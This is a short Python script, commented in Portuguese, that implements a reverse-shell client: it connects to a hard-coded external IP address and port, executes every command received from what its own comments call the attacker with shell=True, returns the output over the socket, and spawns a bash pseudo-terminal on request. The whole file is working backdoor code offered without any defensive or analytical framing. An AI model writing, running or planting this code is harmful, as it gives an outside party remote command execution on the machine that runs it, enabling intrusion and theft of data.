import socket
import subprocess
import os
import pty

# Substitua pelo IP da sua instância EC2
server_ip = "3.148.177.247"
server_port = 8553

# Cria um socket e conecta ao servidor
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

# Função para executar comandos e retornar a saída
def execute_command(command):
    if command.startswith("cd "):
        try:
            os.chdir(command.strip("cd "))
            return b"Changed directory\n"
        except FileNotFoundError as e:
            return str(e).encode()
    else:
        output = subprocess.run(command, shell=True, capture_output=True)
        return output.stdout + output.stderr

while True:
    # Recebe o comando do atacante
    command = client.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break

    # Executa o comando e envia a saída de volta
    response = execute_command(command)
    client.send(response)

    # Se o comando for para iniciar um shell interativo
    if command.lower() == "shell":
        # Cria um terminal pseudo-interativo
        pty.spawn("/bin/bash")

client.close()
